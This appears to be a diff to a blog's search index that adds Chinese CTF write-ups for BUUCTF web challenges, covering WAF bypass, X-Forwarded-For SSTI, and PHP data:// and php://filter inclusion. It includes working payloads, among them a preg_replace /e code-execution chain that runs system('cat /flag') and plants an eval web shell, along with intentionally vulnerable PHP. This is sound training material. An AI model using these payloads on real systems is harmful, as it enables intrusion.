@@ -354,7 +354,7 @@ if(isset($_GET['exp'])){
     <content><![CDATA[<h2 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h2><p><img src="/2021/05/12/buu/buuctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p>
 <p>打开靶机后提示连接</p>
 <p>指令格式 ssh -p port</p>
-<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#111;&#x6f;&#x74;&#64;&#110;&#x6f;&#100;&#x65;&#51;&#x2e;&#x62;&#x75;&#x75;&#x6f;&#x6a;&#46;&#99;&#x6e;">&#114;&#111;&#x6f;&#x74;&#64;&#110;&#x6f;&#100;&#x65;&#51;&#x2e;&#x62;&#x75;&#x75;&#x6f;&#x6a;&#46;&#99;&#x6e;</a></p>
+<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#110;&#111;&#100;&#x65;&#x33;&#x2e;&#98;&#117;&#117;&#111;&#x6a;&#46;&#99;&#110;">&#114;&#111;&#x6f;&#116;&#64;&#110;&#111;&#100;&#x65;&#x33;&#x2e;&#98;&#117;&#117;&#111;&#x6a;&#46;&#99;&#110;</a></p>
 <p>密码：123456</p>
 <h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开容器页面后</p>
 <p>出现三份.txt</p>
@@ -437,7 +437,6 @@ if(isset($_GET['exp'])){
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--假如waf不允许num变量传递字母：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php?num &#x3D; aaaa   &#x2F;&#x2F;显示非法输入的话--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--那么我们可以在num前加个空格：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php? num &#x3D; aaaa--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。--&gt;</span><br></pre></td></tr></table></figure>
 
 <p>成功查询<img src="/2021/05/12/buu/buuctf/image-20210517164118854.png" alt="image-20210517164118854"></p>
-<p>成功查询<img src="/2021/05/12/buu/buuctf/image-20210517164118854.png" alt="image-20210517164118854"></p>
 <p>接下来就是构造payload了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
 
@@ -481,9 +480,9 @@ if(isset($_GET['exp'])){
       </tags>
   </entry>
   <entry>
-    <title>GWCTF 2019 我有一个数据库</title>
+    <title>GWCTF 2019 我有一个数据库&amp;BJDCTF2020 The mystery of ip</title>
     <url>/2021/08/03/buu/7/</url>
-    <content><![CDATA[<p>​    打开页面，奇怪的乱码：</p>
+    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>打开页面，奇怪的乱码：</p>
 <p><img src="/2021/08/03/buu/7/image-20210803200638733.png" alt="image-20210803200638733"></p>
 <p>找了一个乱码恢复页面：<a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">乱码恢复 (mytju.com)</a></p>
 <p><img src="/2021/08/03/buu/7/image-20210803200740870.png" alt="image-20210803200740870"></p>
@@ -512,6 +511,25 @@ if(isset($_GET['exp'])){
 <p><img src="/2021/08/03/buu/7/image-20210803202146319.png" alt="image-20210803202146319"></p>
 <p><img src="/2021/08/03/buu/7/image-20210803202211040.png" alt="image-20210803202211040"></p>
 <h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/SopRomeo/article/details/105536972">GWCTF 2019]我有一个数据库_SopRomeo的博客-CSDN博客</a></p>
+<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2021/08/03/buu/7/image-20210804210338451.png" alt="image-20210804210338451"></p>
+<p>分别查看Flag、Hint</p>
+<p><img src="/2021/08/03/buu/7/image-20210804211511008.png" alt="image-20210804211511008"></p>
+<p><img src="/2021/08/03/buu/7/image-20210804210443630.png" alt="image-20210804210443630"></p>
+<p>看了源码，没有什么可以利用信息</p>
+<p>查看wp，知道了标题的ip有所指</p>
+<p>我们的ip能够被获取，怀疑是与XFF有关</p>
+<p>接着我们进入火狐验证想法</p>
+<p>添加X-Forwarded-For:127.0.0.1</p>
+<p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(366).png" alt="屏幕截图(366)"></p>
+<p>看到回显显示：Your IP is : 127.0.0.1</p>
+<p>说明了想法正确</p>
+<p>利用模板注入</p>
+<p><img src="/2021/08/03/buu/7/image-20210804211235273.png" alt="image-20210804211235273"></p>
+<p><img src="/2021/08/03/buu/7/image-20210804211318879.png" alt="image-20210804211318879"></p>
+<h5 id="知识点：SSTI模板注入"><a href="#知识点：SSTI模板注入" class="headerlink" title="知识点：SSTI模板注入"></a>知识点：SSTI模板注入</h5><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p>
+<p><img src="/2021/08/03/buu/7/1625650-20200216204049347-1844990197.png" alt="img"></p>
+<p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程<br>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
+<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><h5 id="参考博客：-1"><a href="#参考博客：-1" class="headerlink" title="参考博客："></a>参考博客：</h5><h5 id="BJDCTF2020-The-mystery-of-ip-fightte的博客-CSDN博客"><a href="#BJDCTF2020-The-mystery-of-ip-fightte的博客-CSDN博客" class="headerlink" title="BJDCTF2020]The mystery of ip_fightte的博客-CSDN博客"></a><a href="https://blog.csdn.net/fightte/article/details/117003439">BJDCTF2020]The mystery of ip_fightte的博客-CSDN博客</a></h5><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">BJDCTF2020]The mystery of ip - 王叹之 - 博客园 (cnblogs.com)</a></p>
 ]]></content>
       <tags>
         <tag>buu</tag>
@@ -2081,6 +2099,118 @@ if(isset($_GET['exp'])){
 ]]></content>
       <tags>
         <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020 ZJCTF，不过如此</title>
+    <url>/2021/08/06/buu/8/</url>
+    <content><![CDATA[<h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contents函数把整个文件读入一个字符串中。</p>
+<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>file_get_contents(path,include_path,context,start,max_length)</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">path</td>
+<td align="left">必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td align="left">include_path</td>
+<td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td>
+</tr>
+<tr>
+<td align="left">context</td>
+<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
+</tr>
+<tr>
+<td align="left">start</td>
+<td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td>
+</tr>
+<tr>
+<td align="left">max_length</td>
+<td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td>
+</tr>
+</tbody></table>
+<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This is a test file with test text.</span><br></pre></td></tr></table></figure>
+
+<h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a href="https://www.cnblogs.com/soundcode/p/4572251.html">text/html与text/plain有什么区别？ - 左正 - 博客园 (cnblogs.com)</a></p>
+<p>text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p>
+<h4 id="PHP伪协议中的data-协议"><a href="#PHP伪协议中的data-协议" class="headerlink" title="PHP伪协议中的data://协议"></a>PHP伪协议中的data://协议</h4><p>摘抄于：<a href="https://blog.csdn.net/qq_46091464/article/details/106665358">文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客</a></p>
+<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;include.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$file  &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    @include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload1：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>无法使用</strong></p>
+<p>payload2：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p><strong>无法使用</strong></p>
+<p>payload3：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;*</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以使用</strong></p>
+<p>总结：<br>通过实验发现这个可能是编码的问题因为<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法</p>
+<p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。</p>
+<p>2.添加空格改变base64编码。</p>
+<p>3.将+号换成%2b</p>
+<p>所以其实不需要通过base64编码来实现！！！<br>将<?php phpinfo();?>改变成url编码。这样浏览器可以识别！<br><img src="/2021/08/06/buu/8/20200610150733928.png" alt="在这里插入图片描述"></p>
+<h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><p>摘抄于：</p>
+<p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用_hhh-CSDN博客</a></p>
+<p>​    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p>
+<p>​    根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;recource&#x3D;index.php</span><br></pre></td></tr></table></figure>
+
+<p>​    这句话的意思是我们用base64编码的方式来读文件index.php；</p>
+<p>​    这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p>
+<p><strong>总之呢，php://filter协议有一下几个应用：</strong></p>
+<p>1、利用base64获得源码</p>
+<p>2、通过读写编码实行绕过操作</p>
+<p><strong>问：为什么需要用base64才可以看到源码 如果本地源码是明文的话那是不是不用过滤器</strong>？</p>
+<p>​    include一个文件中有php代码会进行php解析，如果是明文，则会直接返回明文。用了过滤器，如果是php文件就不会解析，就可以拿到php文件的源码了</p>
+<p>​    先把要读取的内容经过base64编码然后才能显示出来，之后我们再经过解码就可以是可读的了</p>
+<h4 id="preg-replace（）函数"><a href="#preg-replace（）函数" class="headerlink" title="preg_replace（）函数"></a>preg_replace（）函数</h4><p>文章：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p>
+<h3 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h3><p><img src="/2021/08/06/buu/8/image-20210806084045764.png" alt="image-20210806084045764"></p>
+<p>代码内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;</span><br><span class="line">  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">  if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    die(&quot;Not now!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  include($file); &#x2F;&#x2F;next.php</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>传两个参数，text和file，之间用&amp;连接即可</p>
+<p>目的是获得下列提示的    next.php</p>
+<p>要满足传入的文件内容为：I have a dream</p>
+<p>使用php伪协议中的data:协议和php的filter:协议</p>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/06/buu/8/image-20210806083956451.png" alt="image-20210806083956451"></p>
+<p>解码后代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line"></span><br><span class="line">  return preg_replace(</span><br><span class="line"></span><br><span class="line">​    &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line"></span><br><span class="line">​    &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line"></span><br><span class="line">​    $str</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line"></span><br><span class="line">  echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line"></span><br><span class="line">  @eval($_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现 preg_replace（）函数是一个代码执行的问题</p>
+<p>发现这是用固定解题格式： <strong>\S*=${}</strong></p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/06/buu/8/image-20210806091905315.png" alt="image-20210806091905315"></p>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;eval($_POST[cmd])&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输错就会·提示相关函数过滤（这里我是斜杆的符号方向输错导致被匹配过滤）</p>
+<p><img src="/2021/08/06/buu/8/image-20210806092259983.png" alt="image-20210806092259983"></p>
+<p>上传成功：</p>
+<p><img src="/2021/08/06/buu/8/image-20210806092509267.png" alt="image-20210806092509267"></p>
+<p><img src="/2021/08/06/buu/8/image-20210806092557240.png" alt="image-20210806092557240"></p>
+<p>或者</p>
+<p><img src="/2021/08/06/buu/8/image-20210806092640868.png" alt="image-20210806092640868"></p>
+<p>借鉴博客：[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
       </tags>
   </entry>
 </search>
